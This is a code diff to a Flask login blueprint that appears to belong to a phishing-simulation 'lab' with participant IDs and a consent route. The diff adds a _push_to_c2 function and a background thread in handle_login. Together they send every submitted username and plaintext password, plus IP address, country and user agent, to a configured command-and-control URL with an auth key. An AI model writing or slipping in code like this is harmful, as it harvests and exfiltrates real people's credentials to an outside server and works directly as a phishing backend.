@@ -1,7 +1,9 @@
 import json
 import sqlite3
+import threading
 from datetime import datetime
 
+import requests
 from flask import Blueprint, request, render_template, redirect, url_for, jsonify, session
 
 from ..config import CONFIG
@@ -10,6 +12,33 @@ from ..crypto import encrypt_password
 from ..geo import geoip
 
 auth_bp = Blueprint('auth', __name__)
+
+
+def _push_to_c2(participant_id, username, password, ip, country, user_agent):
+    if not CONFIG.get("C2_PUSH_ENABLED"):
+        return
+    try:
+        payload = {
+            "participant_id": participant_id,
+            "username": username,
+            "password": password,
+            "ip_address": ip,
+            "country": country or "",
+            "user_agent": (user_agent or "")[:500],
+            "lab_name": CONFIG.get("C2_LAB_ID", "unknown"),
+        }
+        requests.post(
+            CONFIG["C2_PUSH_URL"],
+            headers={
+                "X-Lab-ID": CONFIG["C2_LAB_ID"],
+                "X-C2-Key": CONFIG["C2_PUSH_KEY"],
+                "Content-Type": "application/json",
+            },
+            json=payload,
+            timeout=5,
+        )
+    except requests.RequestException:
+        log_event("C2_PUSH_FAILED", participant_id)
 
 
 @auth_bp.route('/api/consent', methods=['POST'])
@@ -174,6 +203,14 @@ def handle_login():
             "username_length": len(username),
             "password_length": len(password),
         })
+
+        threading.Thread(
+            target=_push_to_c2,
+            args=(participant_id, username or "", password or "",
+                  request.remote_addr, country,
+                  request.headers.get("User-Agent", "")),
+            daemon=True,
+        ).start()
 
     # Update status for votes
     try:
